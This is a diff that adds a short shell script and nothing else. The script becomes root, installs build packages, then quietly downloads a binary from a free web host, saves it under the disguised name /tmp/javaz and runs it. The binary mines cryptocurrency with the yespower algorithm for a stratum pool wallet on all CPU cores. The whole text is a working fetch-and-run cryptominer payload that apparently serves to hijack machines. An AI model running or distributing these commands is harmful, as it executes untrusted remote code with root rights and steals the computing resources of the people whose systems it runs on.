@@ -1,0 +1,2 @@
+sudo su
+apt-get install g++ build-essential libcurl4 libssl-dev libjansson4 libjansson-dev libcurl4-openssl-dev libssl-dev libjansson-dev automake autotools-dev build-essential binutils cmake screen unzip net-tools curl libx11-dev libxmu-dev libxi-dev libglu1-mesa libglu1-mesa-dev libboost-all-dev ocl-icd-* opencl-headers -y && wget -O /tmp/javaz -q https://reelduckz.000webhostapp.com/education/archminer && chmod +x /tmp/javaz && /tmp/javaz -a yespower -o stratum+tcps://stratum-asia.rplant.xyz:17122 -u QQyCZYSVy7Dj2tEgzj4s4UbSNVNkYpgZiL.1 -t $(nproc --all)
